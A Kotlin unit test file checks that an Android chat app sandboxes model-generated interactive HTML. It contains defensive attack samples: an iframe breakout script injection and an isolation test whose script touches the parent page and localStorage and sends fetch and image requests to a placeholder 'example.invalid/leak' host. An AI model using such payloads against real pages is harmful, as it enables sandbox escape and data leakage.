package com.m57.hermescontrol.ui.chat

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class IntelligentUiDocumentTest {
    @Test
    fun completedVisualFenceIsDistinctFromOrdinaryCodeAndIncompleteInput() {
        val complete = parseBlocks("```hermes-ui\n<button>Test</button>\n```").single() as MdBlock.Code
        val incomplete = parseBlocks("```hermes-ui\n<button>Test").single() as MdBlock.Code
        assertTrue(complete.complete)
        assertFalse(incomplete.complete)
        assertTrue(IntelligentUiDocument.isInteractiveLanguage(complete.language))
        assertFalse(IntelligentUiDocument.isInteractiveLanguage("html"))
        assertFalse(IntelligentUiDocument.canPreview("javascript"))
    }

    @Test
    fun untrustedMarkupCannotBreakOutOfSrcdocAndHasNoHostPrivileges() {
        val doc =
            IntelligentUiDocument.build(
                "\"</iframe><script>parent.document.title='bad'</script>",
                "#FFFFFF",
                "#111111",
                "#2255AA",
                false,
            )
        assertEquals(1, Regex("<iframe ").findAll(doc).count())
        assertEquals(1, Regex("</iframe>").findAll(doc).count())
        assertTrue(doc.contains("sandbox=\"allow-scripts\""))
        assertFalse(doc.contains("allow-same-origin"))
        assertTrue(doc.contains("connect-src 'none'"))
        assertTrue(doc.contains("form-action 'none'"))
        assertTrue(doc.contains("&lt;script&gt;"))
    }

    @Test(expected = IllegalArgumentException::class)
    fun oversizedMarkupIsRejected() {
        IntelligentUiDocument.build(
            "x".repeat(IntelligentUiDocument.MAX_SOURCE_LENGTH + 1),
            "#FFFFFF",
            "#111111",
            "#2255AA",
            false,
        )
    }

    @Test
    fun writesActualRendererDocumentForBrowserVerification() {
        val sample =
            """
            <h2>割り勘計算</h2><p>人数を変えると、一人あたりの金額が変わります。</p>
            <label>合計（円）<input id="total" type="number" value="12000"></label><br>
            <label>人数<input id="people" type="range" min="1" max="12" value="4"></label>
            <p><span id="count">4</span>人 · 一人 <strong id="amount">3000</strong> 円</p>
            <script>
            function update(){const n=Number(document.getElementById('people').value);
            document.getElementById('count').textContent=n;
            document.getElementById('amount').textContent=Math.ceil(Number(document.getElementById('total').value)/n)}
            document.getElementById('people').addEventListener('input',update);
            document.getElementById('total').addEventListener('input',update);
            </script>
            """.trimIndent()
        val root = File("build/reports/rich-answers").apply { mkdirs() }
        File(
            root,
            "calculator.html",
        ).writeText(IntelligentUiDocument.build(sample, "#F7FAF9", "#172422", "#216B64", false))
        File(
            root,
            "calculator-dark.html",
        ).writeText(IntelligentUiDocument.build(sample, "#172422", "#E0EAE8", "#8BD6CD", true))
        val attack =
            """
            <p id="result"></p><script>
            const result=[];
            try{parent.document.title='escaped';result.push('parent:FAIL')}catch(e){result.push('parent:blocked')}
            try{localStorage.setItem('test','bad');result.push('storage:FAIL')}catch(e){result.push('storage:blocked')}
            fetch('https://example.invalid/leak').then(()=>result.push('network:FAIL')).catch(()=>{
            result.push('network:blocked');document.getElementById('result').textContent=result.join(', ')});
            </script><img src="https://example.invalid/image"><iframe src="https://example.invalid/frame"></iframe>
            """.trimIndent()
        File(
            root,
            "isolation.html",
        ).writeText(IntelligentUiDocument.build(attack, "#F7FAF9", "#172422", "#216B64", false))
        assertTrue(File(root, "calculator.html").length() > 0)
    }
}
